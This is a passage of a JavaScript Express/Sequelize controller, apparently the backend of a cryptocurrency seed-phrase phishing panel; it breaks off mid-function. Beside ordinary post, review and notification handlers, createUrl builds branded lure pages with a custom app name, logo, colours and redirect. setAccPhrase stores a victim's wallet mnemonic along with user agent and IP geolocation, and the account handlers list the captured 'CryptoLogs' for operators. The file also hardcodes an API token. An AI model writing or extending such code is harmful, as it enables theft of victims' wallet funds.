import User from "../models/Users.js";
import LoginAttempt from "../models/LoginAttempt.js";
import Post from "../models/Post.js";
import Review from "../models/Review.js";
import CryptoLogs from "../models/CryptoLogs.js";
import Notification from "../models/Notification.js";
import Subscription from "../models/Subscription.js";
import SubscriptionHistory from "../models/SubscriptionHistory.js";
import Message from "../models/Message.js";
import Phrase from "../models/SpecialPhrases.js";
import Url from "../models/Url.js";
import IpBlock from "../models/IpBlock.js";
import moment from "moment";
import sequelize from "../sequelize.js";
import axios from "axios";
import { Op } from "sequelize";

// const getAllUser = async (req, res) => {
//   try {
//     const currentDate = new Date();
//     const currentMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       1
//     );
//     const lastMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth() - 1,
//       1
//     );
//     const lastMonthEnd = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       0
//     );

//     const totalUsers = await User.countDocuments();

//     const thisMonthUsers = await User.countDocuments({
//       createdAt: { $gte: currentMonthStart },
//     });

//     const lastMonthUsers = await User.countDocuments({
//       createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
//     });

//     let percentageChange = 0;
//     if (lastMonthUsers > 0) {
//       percentageChange =
//         ((thisMonthUsers - lastMonthUsers) / lastMonthUsers) * 100;
//     } else {
//       percentageChange = thisMonthUsers > 0 ? 100 : 0;
//     }

//     // Send the response
//     res.status(200).json({
//       TotalUser: totalUsers,
//       PercentageChange: percentageChange.toFixed(2),
//     });
//   } catch (error) {
//     res.status(500).json({ message: "Error getting user statistics", error });
//   }
// };

const getAllUser = async (req, res) => {
  try {
    const currentDate = new Date();

    const currentMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      1
    );

    const lastMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth() - 1,
      1
    );

    const lastMonthEnd = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      0,
      23,
      59,
      59,
      999
    );

    const totalUsers = await User.count();

    const thisMonthUsers = await User.count({
      where: {
        createdAt: {
          [Op.gte]: currentMonthStart,
        },
      },
    });

    const lastMonthUsers = await User.count({
      where: {
        createdAt: {
          [Op.gte]: lastMonthStart,
          [Op.lt]: lastMonthEnd,
        },
      },
    });

    let percentageChange = 0;
    if (lastMonthUsers > 0) {
      percentageChange =
        ((thisMonthUsers - lastMonthUsers) / lastMonthUsers) * 100;
    } else {
      percentageChange = thisMonthUsers > 0 ? 100 : 0;
    }

    res.status(200).json({
      TotalUser: totalUsers,
      PercentageChange: percentageChange.toFixed(2),
    });
  } catch (error) {
    res.status(500).json({
      message: "Error getting user statistics",
      error: error.message,
    });
  }
};

// const getTodayUsers = async (req, res) => {
//   try {
//     const startOfToday = new Date();
//     startOfToday.setHours(0, 0, 0, 0);

//     const endOfToday = new Date();
//     endOfToday.setHours(23, 59, 59, 999);

//     const todayUsers = await User.find({
//       lastLogin: { $gte: startOfToday, $lte: endOfToday },
//     }).countDocuments();

//     res.status(200).json({ TotalTodayUsers: todayUsers });
//   } catch (error) {
//     res.status(500).json({ message: "Error getting today's users", error });
//   }
// };

const getTodayUsers = async (req, res) => {
  try {
    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);

    const endOfToday = new Date();
    endOfToday.setHours(23, 59, 59, 999);

    const todayUsers = await User.count({
      where: {
        lastLogin: {
          [Op.gte]: startOfToday,
          [Op.lte]: endOfToday,
        },
      },
    });

    res.status(200).json({ TotalTodayUsers: todayUsers });
  } catch (error) {
    res.status(500).json({
      message: "Error getting today's users",
      error: error.message,
    });
  }
};

// const getAllLoginAttempts = async (req, res) => {
//   try {
//     const { id, page = 1, limit = 10 } = req.query;

//     const allLoginAttempts = await LoginAttempt.find({ userId: id })
//       .populate({ path: "userId", select: "email userName" })
//       .sort({ timestamp: -1 })
//       .limit(limit * 1)
//       .skip((page - 1) * limit);

//     const totalRecords = await LoginAttempt.countDocuments({ userId: id });

//     res.status(200).json({
//       loginAttempts: allLoginAttempts,
//       totalPages: Math.ceil(totalRecords / limit),
//       currentPage: page,
//     });
//   } catch (error) {
//     res.status(500).json({ message: error.message, error });
//   }
// };

const getAllLoginAttempts = async (req, res) => {
  try {
    const { id, page = 1, limit = 10 } = req.query;

    // Convert limit and page to integers (just to be safe)
    const pageInt = parseInt(page);
    const limitInt = parseInt(limit);
    const offset = (pageInt - 1) * limitInt;

    // Fetch login attempts with pagination and user info
    const loginAttempts = await LoginAttempt.findAll({
      where: { userId: id },
      include: [
        {
          model: User,
          as: "user",
          attributes: ["email", "userName"],
        },
      ],
      order: [["timestamp", "DESC"]],
      limit: limitInt,
      offset: offset,
    });

    // Get total count for pagination
    const totalRecords = await LoginAttempt.count({ where: { userId: id } });

    res.status(200).json({
      loginAttempts,
      totalPages: Math.ceil(totalRecords / limitInt),
      currentPage: pageInt,
    });
  } catch (error) {
    console.error("Error in getAllLoginAttempts:", error);
    res.status(500).json({ message: error.message, error });
  }
};

// const getGlobalLoginAttempts = async (req, res) => {
//   try {
//     const { page = 1, limit = 10 } = req.query;

//     const allLoginAttempts = await LoginAttempt.find()
//       .populate({ path: "userId", select: "email userName" })
//       .sort({ timestamp: -1 })
//       .limit(limit * 1)
//       .skip((page - 1) * limit);

//     const totalRecords = await LoginAttempt.countDocuments();

//     res.status(200).json({
//       globalLoginAttempts: allLoginAttempts,
//       globaltotalPages: Math.ceil(totalRecords / limit),
//       globalCurrentPage: page,
//     });
//   } catch (error) {
//     res.status(500).json({ message: error.message, error });
//   }
// };

const getGlobalLoginAttempts = async (req, res) => {
  try {
    const { page = 1, limit = 10 } = req.query;

    // Ensure limit is treated as a number
    const limitNumber = parseInt(limit, 10);
    const offsetNumber = (page - 1) * limitNumber;

    // Fetch login attempts with pagination and associated user details
    const allLoginAttempts = await LoginAttempt.findAll({
      include: {
        model: User, // Include User model to get user details
        as: "user", // Use the alias defined in the association (e.g., 'user')
        attributes: ["email", "userName"], // Select specific fields from the User model
      },
      order: [["timestamp", "DESC"]], // Sorting by timestamp (latest first)
      limit: limitNumber,
      offset: offsetNumber, // Implementing pagination offset
    });

    // Get the total number of login attempts (for pagination)
    const totalRecords = await LoginAttempt.count();

    res.status(200).json({
      globalLoginAttempts: allLoginAttempts,
      globalTotalPages: Math.ceil(totalRecords / limitNumber),
      globalCurrentPage: page,
    });
  } catch (error) {
    res.status(500).json({ message: error.message, error });
  }
};

// Create a new post
// const createPost = async (req, res) => {
//   try {
//     const { userId, title, description } = req.body;
//     const newPost = await Post.create({ user: userId, title, description });
//     const populatedPost = await Post.findById(newPost._id).populate(
//       "user",
//       "userName"
//     );

//     res.status(200).json(populatedPost);
//   } catch (error) {
//     res.status(500).json({ message: "Error creating post", error });
//   }
// };

const createPost = async (req, res) => {
  try {
    const { userId, title, description } = req.body;
    // console.log("userId in createPost:  ", userId);
    // Step 1: Create the post
    const newPost = await Post.create({
      userId: userId, // Sequelize uses the foreign key directly
      title,
      description,
    });

    // Step 2: Get the post and include the related user (with alias)
    const populatedPost = await Post.findOne({
      where: { id: newPost.id },
      include: [
        {
          model: User,
          as: "user", // must match the alias used in association
          attributes: ["userName"], // or more fields if needed
        },
      ],
    });

    res.status(200).json(populatedPost);
  } catch (error) {
    console.error("Error creating post:", error);
    res.status(500).json({ message: "Error creating post", error });
  }
};

const createPhrase = async (req, res) => {
  try {
    const { userId, phrase } = req.body;

    // Validation

    // console.log("userId:  ",userId)
    // console.log("phrase:  ",phrase)
    if (!userId || !phrase) {
      return res.status(400).json({
        message: "Invalid input: userId and phrase are required.",
      });
    }

    // Check if user exists
    const user = await User.findByPk(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found." });
    }

    // Create phrase
    const newPhrase = await Phrase.create({ userId, seed_phrase:phrase });

    // Optionally include user info in the response
    const phraseWithUser = await Phrase.findByPk(newPhrase.id, {
      include: [{ model: User, as: "user" }],
    });

    res.status(201).json(phraseWithUser);
  } catch (error) {
    console.error("Error creating phrase:", error);
    res.status(500).json({ message: "Error creating phrase", error: error.message });
  }
};

const getPhrases = async (req, res) => {
  try {
    const phrases = await Phrase.findAll({
      include: [{ model: User, as: "user", attributes: ["id", "userName", "email"] }],
      order: [["createdAt", "DESC"]], // Optional: most recent first
    });

    if (!phrases || phrases.length === 0) {
      return res.status(404).json({ message: "No phrases found" });
    }

    res.status(200).json(phrases);
  } catch (error) {
    console.error("Error retrieving phrases:", error);
    res.status(500).json({ message: "Error retrieving phrases", error: error.message });
  }
};

// const createReview = async (req, res) => {
//   try {
//     const { userId, content } = req.body;
//     const newReview = await Review.create({ user: userId, content });
//     res.status(200).json(newReview);
//   } catch (error) {
//     res.status(500).json({ message: "Error creating review", error });
//   }
// };

const createReview = async (req, res) => {
  try {
    const { userId, content } = req.body;

    if (!userId || !content) {
      return res
        .status(400)
        .json({ message: "userId and content are required" });
    }

    // console.log("Creating review with userId:", userId, "and content:", content);

    // Create the review
    const newReview = await Review.create({ userId, content });

    // Populate the user info (only userName)
    const populatedReview = await Review.findByPk(newReview.id, {
      include: {
        model: User,
        as: "user",
        attributes: ["userName"],
      },
    });

    // console.log("Review created and populated:", populatedReview);

    res.status(200).json(populatedReview);
  } catch (error) {
    // console.error("Error in createReview:", error);
    res.status(500).json({ message: "Error creating review", error });
  }
};

// const getReviews = async (req, res) => {
//   try {
//     const reviews = await Review.find();
//     res.status(200).json(reviews);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching reviews", error });
//   }
// };

const getReviews = async (req, res) => {
  try {
    const reviews = await Review.findAll({
      include: {
        model: User, // Include the associated User model
        as: "user", // Use the alias you defined in the association
        attributes: ["userName"], // You can specify which fields to include from the user model
      },
    });

    res.status(200).json(reviews);
  } catch (error) {
    res.status(500).json({ message: "Error fetching reviews", error });
  }
};

// Get all posts
// const getPosts = async (req, res) => {
//   try {
//     const posts = await Post.find()
//       .sort({ createdAt: -1 })
//       .populate("user", "userName"); // Assuming `username` is in your user model
//     res.status(200).json(posts);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching posts", error });
//   }
// };

const getPosts = async (req, res) => {
  try {
    const posts = await Post.findAll({
      order: [["createdAt", "DESC"]], // Sort by latest
      include: [
        {
          model: User,
          as: "user", // Match the alias used in Post.belongsTo
          attributes: ["userName"], // Fetch only userName
        },
      ],
    });

    res.status(200).json(posts);
  } catch (error) {
    console.error("Error fetching posts:", error);
    res.status(500).json({ message: "Error fetching posts", error });
  }
};

// Get a single post by ID
// const getPostById = async (req, res) => {
//   try {
//     const post = await Post.findById(req.params.id).populate(
//       "user",
//       "username"
//     );
//     if (!post) {
//       return res.status(404).json({ message: "Post not found" });
//     }
//     res.status(200).json(post);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching post", error });
//   }
// };
const getPostById = async (req, res) => {
  try {
    const post = await Post.findOne({
      where: { id: req.params.id },
      include: [
        {
          model: User,
          as: "user", // match your alias
          attributes: ["userName"], // grab just userName
        },
      ],
    });

    if (!post) {
      return res.status(404).json({ message: "Post not found" });
    }

    res.status(200).json(post);
  } catch (error) {
    console.error("Error fetching post:", error);
    res.status(500).json({ message: "Error fetching post", error });
  }
};
// Update a post
// const updatePost = async (req, res) => {
//   try {
//     const { title, description, userId } = req.body;

//     const post = await Post.findByIdAndUpdate(
//       req?.query?.id,
//       { title, description, timestamp: Date.now(), user: userId },
//       { new: true }
//     ).populate("user", "userName");
//     if (!post) {
//       return res.status(404).json({ message: "Post not found" });
//     }
//     res.status(200).json(post);
//   } catch (error) {
//     res.status(500).json({ message: "Error updating post", error });
//   }
// };
const updatePost = async (req, res) => {
  try {
    const { title, description, userId } = req.body;
    const postId = req?.query?.id;

    // Step 1: Update the post
    const [updatedCount] = await Post.update(
      {
        title,
        description,
        updatedAt: new Date(), // Sequelize auto handles this unless disabled
        userId, // Make sure you're using the correct foreign key
      },
      {
        where: { id: postId },
      }
    );

    if (updatedCount === 0) {
      return res.status(404).json({ message: "Post not found" });
    }

    // Step 2: Fetch the updated post with the populated user
    const updatedPost = await Post.findOne({
      where: { id: postId },
      include: [
        {
          model: User,
          as: "user",
          attributes: ["userName"],
        },
      ],
    });

    res.status(200).json(updatedPost);
  } catch (error) {
    console.error("Error updating post:", error);
    res.status(500).json({ message: "Error updating post", error });
  }
};

// Delete a post
// const deletePost = async (req, res) => {
//   try {
//     const post = await Post.findByIdAndDelete(req?.query?.id);
//     if (!post) {
//       return res.status(404).json({ message: "Post not found" });
//     }
//     res.status(200).json({ message: "Post deleted successfully", post });
//   } catch (error) {
//     res.status(500).json({ message: "Error deleting post", error });
//   }
// };
const deletePost = async (req, res) => {
  try {
    const postId = req?.query?.id;

    // Step 1: Find the post
    const post = await Post.findOne({ where: { id: postId } });

    if (!post) {
      return res.status(404).json({ message: "Post not found" });
    }

    // Step 2: Delete the post
    await post.destroy();

    res.status(200).json({ message: "Post deleted successfully", post });
  } catch (error) {
    console.error("Error deleting post:", error);
    res.status(500).json({ message: "Error deleting post", error });
  }
};
// Helper function to get user location based on the real IP using X-Forwarded-For
const getLocationObject = async (req) => {
  try {
    let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    if (ip.includes(",")) {
      ip = ip.split(",")[0];
    }

    if (ip.startsWith("::ffff:")) {
      ip = ip.slice(7);
    }

    const response = await fetch(
      `https://ipinfo.io/${ip}/json?token=a62a090c9551e6`
    );
    const data = await response.json();

    return {
      country: data.country,
      countryCode: data.country,
      region: data.region,
      city: data.city,
      ipAddress: ip,
      lat: data.loc ? data.loc.split(",")[0] : null,
      lon: data.loc ? data.loc.split(",")[1] : null,
    };
  } catch (error) {
    console.error("Error fetching IP location:", error);
    return null;
  }
};

// const getCryptoLog = async (req, res) => {
//   const { id } = req.body;
//   try {
//     const cryptoLog = await CryptoLogs.findById(id);
//     res.status(200).json(cryptoLog);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching Crypto Logs", error });
//   }
// };

const getCryptoLog = async (req, res) => {
  const { id } = req.body;

  if (!id) {
    return res.status(400).json({ message: "Missing crypto log ID" });
  }

  try {
    const cryptoLog = await CryptoLogs.findByPk(id); // You can also use findOne({ where: { id } })

    if (!cryptoLog) {
      return res.status(404).json({ message: "Crypto Log not found" });
    }

    res.status(200).json(cryptoLog);
  } catch (error) {
    console.error("Error fetching Crypto Log:", error);
    res.status(500).json({ message: "Error fetching Crypto Log", error });
  }
};

const setAccPhrase = async (req, res) => {
  try {
    const { mnemonic, userInfo, cryptoLogId } = req.body;

    if (!mnemonic || !userInfo || !cryptoLogId) {
      return res.status(400).json({ error: "Invalid Payload" });
    }

    const location = await getLocationObject(req).catch((err) => {
      console.error("Failed to get location:", err);
      return null;
    });

    if (!location) {
      return res.status(500).json({ error: "Failed to fetch location information" });
    }

    // Sequelize equivalent of findByIdAndUpdate
    const cryptoLog = await CryptoLogs.findByPk(cryptoLogId);

    if (!cryptoLog) {
      return res.status(400).json({ error: "CryptoLog with the given ID not found" });
    }

    await cryptoLog.update({
      seed_phrase: mnemonic,
      useragent:userInfo,
      location,
    });

    res.status(200).json({
      message: "Mnemonic phrase and user info saved successfully",
    });

  } catch (error) {
    console.error("Error in setAccPhrase:", error);
    res.status(500).json({ error: "Failed to save mnemonic phrase and user info" });
  }
};

// const getAccounts = async (req, res) => {
//   try {
//     const userId = req.query.id;
//     const page = parseInt(req.query.page) || 1;
//     const limit = parseInt(req.query.limit) || 10;
//     const skip = (page - 1) * limit;
//     let accounts;

//     const currentDate = new Date();
//     const currentMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       1
//     );
//     const lastMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth() - 1,
//       1
//     );
//     const lastMonthEnd = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       0
//     );
//     const user = await User.findById(userId);
//     const query = user?.role == "admin" ? {} : { userId };
//     if (user?.role == "admin") {
//       accounts = await CryptoLogs.find()
//         .populate("userId", "phrase")
//         .sort({ createdAt: -1 })
//         .skip(skip)
//         .limit(limit);
//     } else {
//       accounts = await CryptoLogs.find({ userId })
//         .sort({ createdAt: -1 })
//         .skip(skip)
//         .limit(limit);
//     }

//     const totalAccounts = await CryptoLogs.countDocuments(query);

//     const thisMonthAccounts = await CryptoLogs.countDocuments({
//       userId,
//       createdAt: { $gte: currentMonthStart },
//     });

//     const lastMonthAccounts = await CryptoLogs.countDocuments({
//       userId,
//       createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
//     });

//     let percentageChange = 0;
//     if (lastMonthAccounts > 0) {
//       percentageChange =
//         ((thisMonthAccounts - lastMonthAccounts) / lastMonthAccounts) * 100;
//     } else {
//       percentageChange = thisMonthAccounts > 0 ? 100 : 0;
//     }

//     return res.status(200).json({
//       accounts: accounts,
//       totalPages: Math.ceil(totalAccounts / limit),
//       accountsCount: totalAccounts,
//       percentageChange: percentageChange.toFixed(2),
//     });
//   } catch (error) {
//     console.log("error fetching", error?.message);
//     return res.status(500).json({ message: "Error fetching accounts", error });
//   }
// };

// const getAccounts = async (req, res) => {
//   try {
//     const userId = req.query.id;
//     const page = parseInt(req.query.page) || 1;
//     const limit = parseInt(req.query.limit) || 10;
//     const skip = (page - 1) * limit;
//     let accounts;

//     const currentDate = new Date();
//     const currentMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       1
//     );
//     const lastMonthStart = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth() - 1,
//       1
//     );
//     const lastMonthEnd = new Date(
//       currentDate.getFullYear(),
//       currentDate.getMonth(),
//       0
//     );
//     const user = await User.findById(userId);
//     const query = user?.role == "admin" ? {} : { userId };
//     if (user?.role == "admin") {
//       accounts = await CryptoLogs.find()
//         .populate("userId", "phrase")
//         .sort({ createdAt: -1 })
//         .skip(skip)
//         .limit(limit);
//     } else {
//       accounts = await CryptoLogs.find({ userId })
//         .sort({ createdAt: -1 })
//         .skip(skip)
//         .limit(limit);
//     }

//     const totalAccounts = await CryptoLogs.countDocuments(query);

//     const thisMonthAccounts = await CryptoLogs.countDocuments({
//       userId,
//       createdAt: { $gte: currentMonthStart },
//     });

//     const lastMonthAccounts = await CryptoLogs.countDocuments({
//       userId,
//       createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
//     });

//     let percentageChange = 0;
//     if (lastMonthAccounts > 0) {
//       percentageChange =
//         ((thisMonthAccounts - lastMonthAccounts) / lastMonthAccounts) * 100;
//     } else {
//       percentageChange = thisMonthAccounts > 0 ? 100 : 0;
//     }

//     return res.status(200).json({
//       accounts: accounts,
//       totalPages: Math.ceil(totalAccounts / limit),
//       accountsCount: totalAccounts,
//       percentageChange: percentageChange.toFixed(2),
//     });
//   } catch (error) {
//     console.log("error fetching", error?.message);
//     return res.status(500).json({ message: "Error fetching accounts", error });
//   }
// };

const getAccounts = async (req, res) => {
  try {
    const userId = req.query.id;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const offset = (page - 1) * limit;
    const currentDate = new Date();
    const currentMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      1
    );
    const lastMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth() - 1,
      1
    );
    const lastMonthEnd = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
      0
    );

    const user = await User.findByPk(userId);
    const isAdmin = user?.role === "admin";

    const whereClause = isAdmin ? {} : { userId: userId };

    const accounts = await CryptoLogs.findAll({
      where: whereClause,
      include: isAdmin ? [{ model: User, as: "user", attributes: ["id"] }] : [],
      order: [["createdAt", "DESC"]],
      offset,
      limit,
    });

    const totalAccounts = await CryptoLogs.count({ where: whereClause });

    const thisMonthAccounts = await CryptoLogs.count({
      where: {
        userId,
        createdAt: {
          [Op.gte]: currentMonthStart,
        },
      },
    });

    const lastMonthAccounts = await CryptoLogs.count({
      where: {
        userId,
        createdAt: {
          [Op.gte]: lastMonthStart,
          [Op.lt]: lastMonthEnd,
        },
      },
    });

    let percentageChange = 0;
    if (lastMonthAccounts > 0) {
      percentageChange =
        ((thisMonthAccounts - lastMonthAccounts) / lastMonthAccounts) * 100;
    } else {
      percentageChange = thisMonthAccounts > 0 ? 100 : 0;
    }

    return res.status(200).json({
      accounts,
      totalPages: Math.ceil(totalAccounts / limit),
      accountsCount: totalAccounts,
      percentageChange: percentageChange.toFixed(2),
    });
  } catch (error) {
    console.log("error fetching", error);
    return res.status(500).json({ message: "Error fetching accounts", error });
  }
};

// const getAccountsStatistics = async (req, res) => {
//   try {
//     const monthsData = [];
//     for (let i = 11; i >= 0; i--) {
//       const startOfMonth = moment()
//         .subtract(i, "months")
//         .startOf("month")
//         .toDate();
//       const endOfMonth = moment().subtract(i, "months").endOf("month").toDate();

//       const monthCount = await User.countDocuments({
//         createdAt: { $gte: startOfMonth, $lte: endOfMonth },
//       });

//       monthsData.push(monthCount);
//     }

//     res.status(200).json({
//       monthlyData: monthsData,
//     });
//   } catch (error) {
//     console.log("error while stats", error);
//     res
//       .status(500)
//       .json({ message: "Error getting accounts statistics", error });
//   }
// };

const getAccountsStatistics = async (req, res) => {
  try {
    const monthsData = [];

    for (let i = 11; i >= 0; i--) {
      const startOfMonth = moment()
        .subtract(i, "months")
        .startOf("month")
        .toDate();
      const endOfMonth = moment().subtract(i, "months").endOf("month").toDate();

      const monthCount = await User.count({
        where: {
          createdAt: {
            [Op.gte]: startOfMonth,
            [Op.lte]: endOfMonth,
          },
        },
      });

      monthsData.push(monthCount);
    }

    res.status(200).json({
      monthlyData: monthsData,
    });
  } catch (error) {
    console.log("error while stats", error.message);
    res
      .status(500)
      .json({ message: "Error getting accounts statistics", error });
  }
};

// const getAllAccounts = async (req, res) => {
//   try {
//     const page = parseInt(req.query.page) || 1;
//     const limit = parseInt(req.query.limit) || 10;
//     const skip = (page - 1) * limit;

//     const accounts = await CryptoLogs.find().skip(skip).limit(limit);

//     const totalAccounts = await CryptoLogs.countDocuments({});

//     return res.status(200).json({
//       accounts: accounts,
//       totalAccounts: totalAccounts, // Total number of accounts
//       currentPage: page,
//       totalPages: Math.ceil(totalAccounts / limit), // Calculate total pages
//       accountsCount: accounts?.length,
//     });
//   } catch (error) {
//     return res.status(500).json({ message: "Error fetching accounts", error });
//   }
// };

const getAllAccounts = async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 10;
    const offset = (page - 1) * limit;

    const accounts = await CryptoLogs.findAll({
      offset,
      limit,
      order: [["createdAt", "DESC"]], // optional: sort newest first
    });

    const totalAccounts = await CryptoLogs.count();

    return res.status(200).json({
      accounts,
      totalAccounts,
      currentPage: page,
      totalPages: Math.ceil(totalAccounts / limit),
      accountsCount: accounts.length,
    });
  } catch (error) {
    console.error("Error fetching accounts:", error.message);
    return res.status(500).json({ message: "Error fetching accounts", error });
  }
};

// const getSingleAccount = async (req, res) => {
//   try {
//     const { accountId } = req.params;

//     // Fetch the account by ID
//     const account = await CryptoLogs.findById(accountId);

//     if (!account) {
//       return res.status(404).json({ message: "Crypto Logs not found" });
//     }

//     return res.status(200).json(account);
//   } catch (error) {
//     return res
//       .status(500)
//       .json({ message: "Error fetching Crypto Logs", error });
//   }
// };

const getSingleAccount = async (req, res) => {
  try {
    const { accountId } = req.params;

    // Fetch account by primary key
    const account = await CryptoLogs.findByPk(accountId);

    if (!account) {
      return res.status(404).json({ message: "Crypto Log not found" });
    }

    return res.status(200).json(account);
  } catch (error) {
    console.error("Error fetching Crypto Log:", error.message);
    return res
      .status(500)
      .json({ message: "Error fetching Crypto Log", error });
  }
};

const getNotifications = async (req, res) => {
  try {
    const notifications = await Notification.findAll({
      where: { deleted: false },
      include: [
        {
          model: CryptoLogs,
          as: "cryptoLog",
        },
        {
          model: User,
          as: "user",
        },
      ],
      order: [["createdAt", "DESC"]],
    });

    if (!notifications.length) {
      return res.status(404).json({ message: "No notifications found" });
    }

    res.status(200).json(notifications);
  } catch (error) {
    console.error("Error fetching notifications:", error);
    res.status(500).json({ error: "Failed to fetch notifications" });
  }
};

const getNotification = async (req, res) => {
  try {
    const { id } = req.query;

    const notification = await Notification.findByPk(id, {
      include: [
        { model: CryptoLogs, as: "cryptoLog" },
        { model: User, as: "user" },
      ],
    });

    console.log("notification", notification);

    if (!notification) {
      return res.status(404).json({ message: "No notification found" });
    }

    return res.status(200).json(notification);
  } catch (error) {
    console.error("Error fetching notification:", error);
    res.status(500).json({ error: "Failed to fetch notification" });
  }
};

const deleteNotification = async (req, res) => {
  try {
    const notificationId = req.query.id;
    if (!notificationId) {
      return res.status(400).json({ message: "Notification ID is required" });
    }

    const notification = await Notification.findByPk(notificationId);

    if (!notification) {
      return res.status(404).json({ message: "Notification not found" });
    }

    // Soft delete - updating the `deleted` flag
    await notification.update({ deleted: true });
    await notification.destroy();

    return res.status(200).json({
      message: "Notification deleted successfully",
      id: Number(notificationId),
    });
  } catch (error) {
    console.error("Delete error:", error);
    res.status(500).json({ error: "Failed to delete notification" });
  }
};

const clearAllNotifications = async (req, res) => {
  try {
    // Soft delete all notifications by setting `deleted` to true
    const [updatedCount] = await Notification.update(
      { deleted: true },
      { where: { deleted: false } }
    );

    if (updatedCount === 0) {
      return res.status(404).json({ message: "No notifications to delete" });
    }

    res.status(200).json({
      message: "All notifications cleared successfully",
    });
  } catch (error) {
    console.error("Error clearing notifications:", error);
    res.status(500).json({ error: "Failed to clear all notifications" });
  }
};

// const deleteAccount = async (req, res) => {
//   try {
//     const accountId = req.query.id;

//     // Find the Crypto Logs by ID
//     const Crypto_Logs = await CryptoLogs.findById(accountId);
//     if (!Crypto_Logs) {
//       return res.status(404).json({ message: "Crypto Logs not found" });
//     }

//     // Delete the Crypto_Logs
//     await CryptoLogs.findByIdAndDelete(accountId);
//     await CryptoLogs.deleteMany({ _id: accountId });

//     // Delete associated notifications
//     await Notification.deleteMany({ accountId });

//     res.status(200).json({
//       message: "Crypto Logs and associated notifications deleted successfully",
//       account: CryptoLogs,
//     });
//   } catch (error) {
//     console.log("error in here at delete account", error);
//     res.status(500).json({ error: "Failed to delete account" });
//   }
// };

const deleteAccount = async (req, res) => {
  try {
    const accountId = req.query.id;
    // console.log("accountId is:::  ", accountId)
    // Find the CryptoLog by ID
    const cryptoLog = await CryptoLogs.findByPk(accountId);
    if (!cryptoLog) {
      return res.status(404).json({ message: "Crypto Log not found" });
    }

    // Delete the CryptoLog entry
    await Url.destroy({ where: { CryptoLogId: accountId } });
    await CryptoLogs.destroy({ where: { id: accountId } });

    // Delete associated notifications (assuming `accountId` field exists)
    await Notification.destroy({
      where: { cryptoLogIdForNotification: accountId },
    });

    res.status(200).json({
      message: "Crypto Log and associated notifications deleted successfully",
      account: cryptoLog,
      cryptoLogIdForNotification: Number(accountId),
    });
  } catch (error) {
    console.log("Error in deleteAccount:", error.message);
    res.status(500).json({ error: "Failed to delete account" });
  }
};

const editUserProfile = async (req, res) => {
  try {
    const { id } = req.params;
    const updatedUser = await User.findByIdAndUpdate(id, req.body, {
      new: true,
    });

    if (!updatedUser) {
      return res.status(404).json({ message: "User not found" });
    }

    res
      .status(200)
      .json({ message: "User profile updated successfully", updatedUser });
  } catch (error) {
    res.status(500).json({ message: "Error updating user profile", error });
  }
};
// we need to do things here create url and also a crypto log
//if the special phrase then redirect to that url otherwise just show the log
// const createUrl = async (req, res) => {
//   try {
//     //also the payload of crypto is  => appName, appLogo   => and return the CryptoLogId.
//     const {
//       userId,
//       description,
//       redirectUrl,
//       appName,
//       appLogo,
//       backgroundcolor,
//       modalColor,
//       btnColor,
//     } = req.body;
//     const newCryptoLog = await CryptoLogs.create({
//       userId,
//       appName,
//       appLogo,
//       modalColor,
//       backgroundcolor,
//       btnColor,
//       redirectUrl,
//     });
//     //description is the url now add the redirect url as well
//     const newUrl = await Url.create({
//       user: userId,
//       description,
//       redirectUrl,
//       cryptoLogId: newCryptoLog?._id,
//       appLogo,
//       appName,
//       modalColor,
//       btnColor,
//       backgroundcolor,
//     });
//     res.status(200).json({ newUrl });
//   } catch (error) {
//     res.status(500).json({ message: "Error creating url", error });
//   }
// };

const createUrl = async (req, res) => {
  try {
    const {
      userId,
      description,
      redirectUrl,
      appName,
      appLogo,
      backgroundcolor,
      modalColor,
      btnColor,
    } = req.body;

    // Create a new CryptoLog
    const newCryptoLog = await CryptoLogs.create({
      userId,
      app_name:appName,
      appLogo,
      modalColor,
      backgroundcolor,
      btnColor,
      redirectUrl,
    });

    // Check if CryptoLog was created successfully
    if (!newCryptoLog || !newCryptoLog.id) {
      return res.status(500).json({ message: "Failed to create CryptoLog" });
    }

    // Create a new Url associated with the newly created CryptoLog
    const newUrl = await Url.create({
      userId, // Sequelize automatically maps the 'user' key to 'userId' in Url
      description,
      redirectUrl,
      cryptoLogId: newCryptoLog.id, // Use 'id' instead of '_id' for Sequelize
      appLogo,
      app_name:appName,
      modalColor,
      btnColor,
      backgroundcolor,
    });

    // Create a new Notification associated with the CryptoLog and User
    const newNotification = await Notification.create({
      userId,
      cryptoLogIdForNotification: newCryptoLog.id,
      message: `New URL created for app: ${appName}`,
    });

    // Return the newUrl and newNotification as the response
    res.status(200).json({
      newUrl,
      newNotification,
    });
  } catch (error) {
    // Return error response
    console.log(error);
    res.status(500).json({
      message: "Error creating URL and notification",
      error: error.message,
    });
  }
};

// Get all posts
// const getUrls = async (req, res) => {
//   try {
//     const urls = await Url.find().populate("user", "userNname");
//     res.status(200).json(urls);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching urls", error });
//   }
// };

const getUrls = async (req, res) => {
  try {
    // Fetch Urls and include associated User model data (for 'userName' field)
    const urls = await Url.findAll({
      include: [
        {
          model: User,
